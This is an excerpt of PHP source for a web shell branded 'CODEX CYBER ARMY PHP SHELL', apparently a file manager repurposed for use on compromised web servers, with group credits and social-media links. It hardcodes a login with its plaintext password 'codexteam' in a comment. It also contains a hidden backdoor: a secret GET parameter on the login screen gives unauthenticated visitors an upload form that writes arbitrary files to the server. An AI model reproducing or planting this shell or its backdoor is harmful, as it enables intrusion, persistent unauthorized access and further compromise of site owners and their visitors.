...
define('APP_TITLE', '𝗖0𝗗3𝗫 𝗣𝗛𝗣 𝗦𝗛𝗘𝗟𝗟 𝗙𝗜𝗥𝗦𝗧 𝗘𝗗𝗜𝗧𝗜𝗢𝗡');

$use_auth = true;

$auth_users = array(
    'codex' => '$2y$10$HvqeUgaaZRNm1s2tYVMItOryjxd0YRThRQi1YxVR5gXkt3/SAHR9i', //codexteam
);
    ...
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        if(function_exists('password_verify')) {
            if (isset($auth_users[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']])) {
                ...
                fm_set_msg(lng('You are logged in.<br><br>CODEX CYBER ARMY PHP SHELL FIRST EDITION'));
        ...
        unset($_SESSION[FM_SESSION_ID]['logged']);
        fm_show_header_login();
        if($_GET['00000'] == '11111'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); }
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        ...
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                        	...
                        	<center><img src="https://i.imgur.com/mL4nqp6.png" alt="C0D3X CYBER ARMY" style="width:250px;height:250px;"></center>
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    ...
                                    <div class="footer text-center">
                                     &mdash;&mdash; &copy;
                                           <a href="https://www.facebook.com/C0D3X.CDX/" target="_blank" class="text-muted" data-version="<?php echo VERSION; ?>">C0D3X CYBER ARMY</a> &mdash;&mdash;
                                     </div>
                                </form>
                            </div>
                        </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="#" target="_blank" class="app-v-title"> CODEX CYBER ARMY <?php echo VERSION; ?></a></h3></p>
                        <p>Author: Shun Sama</p>
                        <p>FB : <a href="https://www.facebook.com/bl4ckra1n">Shun Sama : Facebook</a> </p>
                        <p>COD3X PAGE : <a href="https://www.facebook.com/C0D3X.CDX/">C0D3X CYBER ARMY</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://www.facebook.com/C0D3X.CDX/" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://www.facebook.com/C0D3X.CDX/" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <li class="list-group-item"><a href="https://www.facebook.com/C0D3X.CDX/" target="_blank"><i class="fa fa-link"> </i> <?php echo lng('Check Latest Version') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
                    ...
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            ...
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php echo lng('Generate new password hash? <br>Please contact us codex fb page thank you. ') ?></label>
                            </div>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://www.facebook.com/C0D3X.CDX/" target="_blank" class="float-right text-muted">CODEX CYBER ARMY <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://www.facebook.com/C0D3X.CDX/" target="_blank" class="float-right text-muted">CODEX CYBER ARMY <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'CODEX CYBER ARMY<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <meta name="description" content="CODEX CYBER ARMY">
    <meta name="author" content="CODEX CYBER ARMY">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'CODEX CYBER ARMY';      $tr['en']['AppTitle']           = 'CODEX CYBER ARMY';
